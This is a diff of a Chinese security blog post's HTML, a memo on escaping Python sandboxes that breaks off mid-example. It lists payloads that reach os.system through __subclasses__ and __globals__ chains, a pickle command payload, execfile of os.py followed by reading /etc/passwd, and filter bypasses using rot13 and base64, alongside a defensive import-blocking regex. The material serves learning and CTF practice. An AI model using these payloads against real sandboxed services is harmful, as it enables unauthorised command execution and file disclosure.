@@ -1,37 +1,37 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Python 沙盒逃逸备忘 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/6.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/main.css?v=1.0.4"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body style="background:#fbfbfb;"><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Python 沙盒逃逸备忘</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/rss/"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Python 沙盒逃逸备忘</h1><div class="post-meta">May 4, 2018<span> | </span><span class="category"><a href="/categories/web安全/">web安全</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="post-content"><h2 id="一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><a href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）" class="headerlink" title="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）"></a>一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</h2><h3 id="1-func-globals"><a href="#1-func-globals" class="headerlink" title="1.func_globals"></a>1.func_globals</h3><p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals</p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Python 沙盒逃逸备忘 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Python 沙盒逃逸备忘</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Python 沙盒逃逸备忘</h1><div class="post-meta">May 4, 2018<span> | </span><span class="category"><a href="/categories/web安全/">web安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><span class="toc-number">1.</span> <span class="toc-text">一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-func-globals"><span class="toc-number">1.1.</span> <span class="toc-text">1.func_globals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getattribute"><span class="toc-number">1.2.</span> <span class="toc-text">2.__getattribute__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dict"><span class="toc-number">1.3.</span> <span class="toc-text">3.__dict__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-dir"><span class="toc-number">1.4.</span> <span class="toc-text">4.dir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-base"><span class="toc-number">1.5.</span> <span class="toc-text">5.__base__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-mro"><span class="toc-number">1.6.</span> <span class="toc-text">6.__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-subclasses"><span class="toc-number">1.7.</span> <span class="toc-text">7.__subclasses__()[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-import"><span class="toc-number">1.8.</span> <span class="toc-text">8.__import__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-bulitin"><span class="toc-number">1.9.</span> <span class="toc-text">9.__bulitin__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-builtins"><span class="toc-number">1.10.</span> <span class="toc-text">10.__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-reload"><span class="toc-number">1.11.</span> <span class="toc-text">11.reload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-getattr"><span class="toc-number">1.12.</span> <span class="toc-text">12.getattr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-getattr"><span class="toc-number">1.13.</span> <span class="toc-text">13.__getattr__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-name"><span class="toc-number">1.14.</span> <span class="toc-text">14.__name__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-func-code"><span class="toc-number">1.15.</span> <span class="toc-text">15.func_code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-timeit-模块"><span class="toc-number">1.16.</span> <span class="toc-text">16.timeit 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-platform-模块"><span class="toc-number">1.17.</span> <span class="toc-text">17.platform 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-globals"><span class="toc-number">1.18.</span> <span class="toc-text">18.__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-call"><span class="toc-number">1.19.</span> <span class="toc-text">19.__call__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-pickle"><span class="toc-number">1.20.</span> <span class="toc-text">20.pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-os-subprocess-commands"><span class="toc-number">1.21.</span> <span class="toc-text">21.os/subprocess/commands</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-eval-exec-execfile"><span class="toc-number">1.22.</span> <span class="toc-text">22.eval/exec/execfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-importlib模块"><span class="toc-number">1.23.</span> <span class="toc-text">23.importlib模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、什么是python-的沙箱逃逸"><span class="toc-number">2.</span> <span class="toc-text">二、什么是python 的沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、攻与防的战争"><span class="toc-number">3.</span> <span class="toc-text">三、攻与防的战争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、整理一些小trick"><span class="toc-number">4.</span> <span class="toc-text">四、整理一些小trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、魔法方法"><span class="toc-number">5.</span> <span class="toc-text">五、魔法方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-魔法方法简介"><span class="toc-number">5.1.</span> <span class="toc-text">1.魔法方法简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-一切皆对象的py"><span class="toc-number">5.1.1.</span> <span class="toc-text">2.一切皆对象的py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、内存破坏突破python沙盒"><span class="toc-number">6.</span> <span class="toc-text">六、内存破坏突破python沙盒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、一些简单的python-沙盒"><span class="toc-number">7.</span> <span class="toc-text">七、一些简单的python 沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目一、"><span class="toc-number">7.1.</span> <span class="toc-text">题目一、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目二"><span class="toc-number">7.2.</span> <span class="toc-text">题目二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目三"><span class="toc-number">7.3.</span> <span class="toc-text">题目三</span></a></li></ol></li></ol></div></div><div class="post-content"><h2 id="一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><a href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）" class="headerlink" title="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）"></a>一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</h2><h3 id="1-func-globals"><a href="#1-func-globals" class="headerlink" title="1.func_globals"></a>1.func_globals</h3><p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals</p>
 <pre><code>&gt;&gt;&gt; def foo(): pass
 ...
 &gt;&gt;&gt; foo.func_globals
-{&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;foo&apos;: &lt;function     foo at 0x7f3a056c7938&gt;, &apos;__doc__&apos;: None, &apos;__package__&apos;: None}
+{&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;foo&#39;: &lt;function     foo at 0x7f3a056c7938&gt;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None}
 </code></pre><a id="more"></a>
 <h3 id="2-getattribute"><a href="#2-getattribute" class="headerlink" title="2.__getattribute__"></a>2.<code>__getattribute__</code></h3><p>被调用无条件地实现类的实例的属性访问。</p>
 <p>object. <strong>getattribute</strong>(self, name)<br>1）self 必需的。类的实例，在调用时自动传递。<br>2）name 必需的。属性的名称。</p>
-<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)
+<pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)
 </code></pre><h3 id="3-dict"><a href="#3-dict" class="headerlink" title="3.__dict__"></a>3.<code>__dict__</code></h3><p>模块对象有一个由dictionary对象实现的名称空间(这是由模块中定义的函数的func_globals属性引用的字典)。属性引用在本词典中被翻译为查找，例如，<br>m.x相当于m.<strong>dict</strong> [“x”]。</p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]  
-&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__dict__[&#39;upper&#39;]  
+&lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.upper
-&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.upper
+&lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;
 </code></pre><h3 id="4-dir"><a href="#4-dir" class="headerlink" title="4.dir()"></a>4.dir()</h3><p>将显示对象的属性的名称，<code>__dict__</code>是dir()的子集<br>dir ([object])</p>
-<pre><code>&gt;&gt;&gt; dir(&apos;&apos;.__class__)
-[&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getitem__&apos;, &apos;__getnewargs__&apos;, &apos;__getslice__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__le__&apos;, &apos;__len__&apos;, &apos;__lt__&apos;, &apos;__mod__&apos;, &apos;__mul__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__rmod__&apos;, &apos;__rmul__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;_formatter_field_name_split&apos;, &apos;_formatter_parser&apos;, &apos;capitalize&apos;, &apos;center&apos;, &apos;count&apos;, &apos;decode&apos;, &apos;encode&apos;, &apos;endswith&apos;, &apos;expandtabs&apos;, &apos;find&apos;, &apos;format&apos;, &apos;index&apos;, &apos;isalnum&apos;, &apos;isalpha&apos;, &apos;isdigit&apos;, &apos;islower&apos;, &apos;isspace&apos;, &apos;istitle&apos;, &apos;isupper&apos;, &apos;join&apos;, &apos;ljust&apos;, &apos;lower&apos;, &apos;lstrip&apos;, &apos;partition&apos;, &apos;replace&apos;, &apos;rfind&apos;, &apos;rindex&apos;, &apos;rjust&apos;, &apos;rpartition&apos;, &apos;rsplit&apos;, &apos;rstrip&apos;, &apos;split&apos;, &apos;splitlines&apos;, &apos;startswith&apos;, &apos;strip&apos;, &apos;swapcase&apos;, &apos;title&apos;, &apos;translate&apos;, &apos;upper&apos;, &apos;zfill&apos;]
+<pre><code>&gt;&gt;&gt; dir(&#39;&#39;.__class__)
+[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mod__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmod__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_formatter_field_name_split&#39;, &#39;_formatter_parser&#39;, &#39;capitalize&#39;, &#39;center&#39;, &#39;count&#39;, &#39;decode&#39;, &#39;encode&#39;, &#39;endswith&#39;, &#39;expandtabs&#39;, &#39;find&#39;, &#39;format&#39;, &#39;index&#39;, &#39;isalnum&#39;, &#39;isalpha&#39;, &#39;isdigit&#39;, &#39;islower&#39;, &#39;isspace&#39;, &#39;istitle&#39;, &#39;isupper&#39;, &#39;join&#39;, &#39;ljust&#39;, &#39;lower&#39;, &#39;lstrip&#39;, &#39;partition&#39;, &#39;replace&#39;, &#39;rfind&#39;, &#39;rindex&#39;, &#39;rjust&#39;, &#39;rpartition&#39;, &#39;rsplit&#39;, &#39;rstrip&#39;, &#39;split&#39;, &#39;splitlines&#39;, &#39;startswith&#39;, &#39;strip&#39;, &#39;swapcase&#39;, &#39;title&#39;, &#39;translate&#39;, &#39;upper&#39;, &#39;zfill&#39;]
 </code></pre><h3 id="5-base"><a href="#5-base" class="headerlink" title="5.__base__"></a>5.<code>__base__</code></h3><p>每个类都有一个<code>__base__</code>属性能列出器基类<br><strong>注意：</strong><code>__base__</code> 和 <code>__bases__</code>的区别<br>他们都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__
-&lt;type &apos;basestring&apos;&gt;
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__base__
+&lt;type &#39;basestring&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__
-(&lt;type &apos;basestring&apos;&gt;,)
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
+(&lt;type &#39;basestring&#39;&gt;,)
 </code></pre><h3 id="6-mro"><a href="#6-mro" class="headerlink" title="6.__mro__"></a>6.<code>__mro__</code></h3><p>递归地显示父类一直到 object </p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__
-(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
 </code></pre><h3 id="7-subclasses"><a href="#7-subclasses" class="headerlink" title="7.__subclasses__()[]"></a>7.<code>__subclasses__</code>()[]</h3><p>获取子类</p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]
-&lt;type &apos;file&apos;&gt;
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]
+&lt;type &#39;file&#39;&gt;
 </code></pre><h3 id="8-import"><a href="#8-import" class="headerlink" title="8.__import__"></a>8.<code>__import__</code></h3><p>import 一个模块</p>
 <p><code>__import__</code> (name)</p>
-<pre><code>&gt;&gt;&gt; __import__(&apos;os&apos;)
-&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;
+<pre><code>&gt;&gt;&gt; __import__(&#39;os&#39;)
+&lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;
 </code></pre><h3 id="9-bulitin"><a href="#9-bulitin" class="headerlink" title="9.__bulitin__"></a>9.<code>__bulitin__</code></h3><p>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为<code>__builtin__</code>，而到了Python3.X版本中，却更名为builtins。</p>
 <h3 id="10-builtins"><a href="#10-builtins" class="headerlink" title="10.__builtins__"></a>10.<code>__builtins__</code></h3><p>是对内建模块的一个引用<br>这个和<code>__builtin__</code>有一些区别</p>
 <p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入<code>__builtin__</code>内建模块;而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p>
@@ -45,7 +45,7 @@ __builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。�
 <pre><code>&gt;&gt;&gt; import sys
 
 &gt;&gt;&gt; reload(sys)
-&lt;module &apos;sys&apos; (built-in)&gt;
+&lt;module &#39;sys&#39; (built-in)&gt;
 </code></pre><h3 id="12-getattr"><a href="#12-getattr" class="headerlink" title="12.getattr"></a>12.getattr</h3><p>返回对象的命名属性的值。<br>getattr (object, name)<br>相当于 object.name<br>name 必须是一个字符串</p>
 <pre><code>&gt;&gt;&gt; class A():
 ...     bar =1
@@ -53,12 +53,12 @@ __builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。�
 
 &gt;&gt;&gt; a = A()
 
-&gt;&gt;&gt; getattr(a,&apos;bar&apos;)
+&gt;&gt;&gt; getattr(a,&#39;bar&#39;)
 1
 </code></pre><h3 id="13-getattr"><a href="#13-getattr" class="headerlink" title="13.__getattr__"></a>13.<code>__getattr__</code></h3><p>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)</p>
 <h3 id="14-name"><a href="#14-name" class="headerlink" title="14.__name__"></a>14.<code>__name__</code></h3><p>这个值获得的只是一个字符串，不是模块的引用<br>要使用sys.modules[<code>__name__</code>]才获得的是模块的引用</p>
-<pre><code>&gt;&gt;&gt; sys.modules[&apos;__main__&apos;]
-&lt;module &apos;__main__&apos; (built-in)&gt;
+<pre><code>&gt;&gt;&gt; sys.modules[&#39;__main__&#39;]
+&lt;module &#39;__main__&#39; (built-in)&gt;
 </code></pre><h3 id="15-func-code"><a href="#15-func-code" class="headerlink" title="15.func_code"></a>15.func_code</h3><p>返回表示已编译函数体的代码对象。</p>
 <pre><code>function.func_code
 
@@ -74,34 +74,34 @@ __builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。�
 0    
 </code></pre><p>co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式）</p>
 <pre><code>&gt;&gt;&gt; foo.func_code.co_code
-&apos;d\x01\x00}\x00\x00d\x00\x00S&apos;
+&#39;d\x01\x00}\x00\x00d\x00\x00S&#39;
 </code></pre><h3 id="16-timeit-模块"><a href="#16-timeit-模块" class="headerlink" title="16.timeit 模块"></a>16.timeit 模块</h3><p>这个模块是用来测试代码的执行时间的，能执行代码自然能执行命令<br>使用前需要导入timeit</p>
 <p>使用：</p>
 <p>timeit(命令，number=1)</p>
 <pre><code>&gt;&gt;&gt; import timeit
-&gt;&gt;&gt; timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)
+&gt;&gt;&gt; timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)
 </code></pre><p>其中命令是字符串的形式</p>
 <h3 id="17-platform-模块"><a href="#17-platform-模块" class="headerlink" title="17.platform 模块"></a>17.platform 模块</h3><p>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令</p>
-<pre><code>print platform.popen(&apos;命令&apos;,mode=&apos;r&apos;,bufsize= -1).read()
+<pre><code>print platform.popen(&#39;命令&#39;,mode=&#39;r&#39;,bufsize= -1).read()
 </code></pre><h3 id="18-globals"><a href="#18-globals" class="headerlink" title="18.__globals__"></a>18.<code>__globals__</code></h3><p><code>function.__globals__</code> 等同于globals()，dir() 的结果是上面两个的键值<br>在fuzz 中常常和 <code>__init__</code>配合使用,<code>__init__</code> 一般跟在类的后面，相当于实例化这个类</p>
-<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)
+<pre><code> [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
 </code></pre><h3 id="19-call"><a href="#19-call" class="headerlink" title="19.__call__"></a>19.<code>__call__</code></h3><p>使实例能够像函数一样被调用<br> x.<strong>call</strong> 等同于 x()</p>
 <pre><code>&gt;&gt;&gt; func.__call__
-&lt;method-wrapper &apos;__call__&apos; of function object at 0x7f3a056c7e60&gt;
+&lt;method-wrapper &#39;__call__&#39; of function object at 0x7f3a056c7e60&gt;
 </code></pre><h3 id="20-pickle"><a href="#20-pickle" class="headerlink" title="20.pickle"></a>20.pickle</h3><p>这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化</p>
 <p>基本的语法：<br>序列化：</p>
 <pre><code>import pickle
-test=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])
+test=(&#39;this is a test&#39;,3.14,[1,2,3,&quot;hh&quot;])
 p=pickle.dumps(test)
 </code></pre><p>反序列化：</p>
 <pre><code>n=pickle.loads(p)
 </code></pre><p>我们可以通过 pickle 的方式加载命令</p>
-<pre><code>pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)
-</code></pre><h3 id="21-os-subprocess-commands"><a href="#21-os-subprocess-commands" class="headerlink" title="21.os/subprocess/commands"></a>21.os/subprocess/commands</h3><pre><code>os.system(&apos;ifconfig&apos;)
-os.popen(&apos;ifconfig&apos;)
-commands.getoutput(&apos;ifconfig&apos;)
-commands.getstatusoutput(&apos;ifconfig&apos;)
-subprocess.call([&apos;ifconfig&apos;],shell=True)
+<pre><code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;)
+</code></pre><h3 id="21-os-subprocess-commands"><a href="#21-os-subprocess-commands" class="headerlink" title="21.os/subprocess/commands"></a>21.os/subprocess/commands</h3><pre><code>os.system(&#39;ifconfig&#39;)
+os.popen(&#39;ifconfig&#39;)
+commands.getoutput(&#39;ifconfig&#39;)
+commands.getstatusoutput(&#39;ifconfig&#39;)
+subprocess.call([&#39;ifconfig&#39;],shell=True)
 </code></pre><p>这里重点说一下subprocess 吧<br>1.subprocess.run()<br>Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</p>
 <p>2.subprocess.call()<br>执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</p>
 <p>3.subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</p>
@@ -119,27 +119,27 @@ importlib.import_module(module)
 <p>python 能执行命令或者存在执行命令功能的函数是一定的，但是他的存在形式是多样的，他过滤了这种形式我们就换一种形式表示，正所谓<strong>曲线救国</strong></p>
 <h2 id="三、攻与防的战争"><a href="#三、攻与防的战争" class="headerlink" title="三、攻与防的战争"></a>三、攻与防的战争</h2><p>简单的梳理一下思路：</p>
 <p>1.我们想直接引入执行命令的模块os等<br>遭遇过滤：</p>
-<pre><code>re.compile(&apos;import\s+(os|commands|subprocess|sys)&apos;)
+<pre><code>re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)
 </code></pre><p>2.我们不直接使用import 用<code>__import__()</code>取而代之<br>遭遇过滤：<code>__import__(module)</code></p>
 <p>3.我们不直接用<code>__import__(module)</code> 转换编码<br><code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code><br>遭遇过滤<code>__import__</code></p>
 <p>4.不用<code>__import__</code>行不行？当然可以，我们有内建函数直接调用<br><code>__bulitin__</code>/<code>__bulitins__</code><br>常见的一些危险的函数都是<code>__builtin__</code>里面的，我们可以直接用 eval() exec() execfile()<br>遭遇过滤：把<code>__builtin__</code> 中的危险函数都del掉，看你怎么绕</p>
 <p>5.reload() 函数重新加载完整的没有阉割的<code>__builtin__</code><br>reload(<code>__builtin__</code>)<br>遭遇过滤：reload()也是一个内建函数，如果我们在<code>__builtin__</code>中把reload()也del掉呢？</p>
 <p>6.imp模块也是一个可以引入东西的一个模块<br>import imp<br>imp.reload(<code>__builtin__</code>)<br>再次成功引入<br>遭遇过滤：看来还是没有从源头del干净，我们知道python 的模块其实都存放在sys.modules中，不要啥就删啥。</p>
-<pre><code>sys.modules[&apos;os&apos;]=None
+<pre><code>sys.modules[&#39;os&#39;]=None
 </code></pre><p>这样就OK了</p>
 <p>7.这回问题有点棘手，要知道如何应对还要仔细分析一下import的步骤<br>import 的步骤：</p>
 <p>1）如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>2）如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>
 <p>那我们可以向更源头追溯<br>我们都知道任何的模块归根道理都是文件，只要文件还在，我们就一定有办法！<br>比如类unix 的系统中，os 模块的路径一般都是/usr/lib/python2.7/os.py，那我们就直接写这个</p>
 <pre><code>import sys
 
-sys.modules[&apos;os&apos;] = &apos;/usr/lib/python2.7/os.py&apos;
+sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;
 
 import os
 </code></pre><p>遭遇过滤：我把你sys也一并del，让你用！哼</p>
 <p>8.和上面一样的思路，文件还在我们就直接用文件，import 的本质就是把对应的模块文件执行一遍</p>
-<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)
+<pre><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;)
 
-system(&apos;cat /etc/passwd&apos;)
+system(&#39;cat /etc/passwd&#39;)
 </code></pre><p>遭遇过滤：execfile() 别用了</p>
 <p>9.那我用文件读取函数读入文件，然后再exec() 也能实现一样的效果</p>
 <p>遭遇过滤：不耐烦了，我也不过滤了，直接删文件</p>
@@ -160,7 +160,7 @@ system(&quot;ls /&quot;)
 <pre><code>&quot;l&quot;+&quot;s&quot;
 &quot;func_global&quot;+&quot;s&quot;
 </code></pre><p>6.字符串编码或者其他操作<br>如果过滤的是键值对中的key(为了强调是字符串类型)<br>方法一：使用编码的转换</p>
-<pre><code>&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)
+<pre><code>&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)
 </code></pre><p>方法二：使用python的字符串操作</p>
 <pre><code>s = &quot;emit&quot;
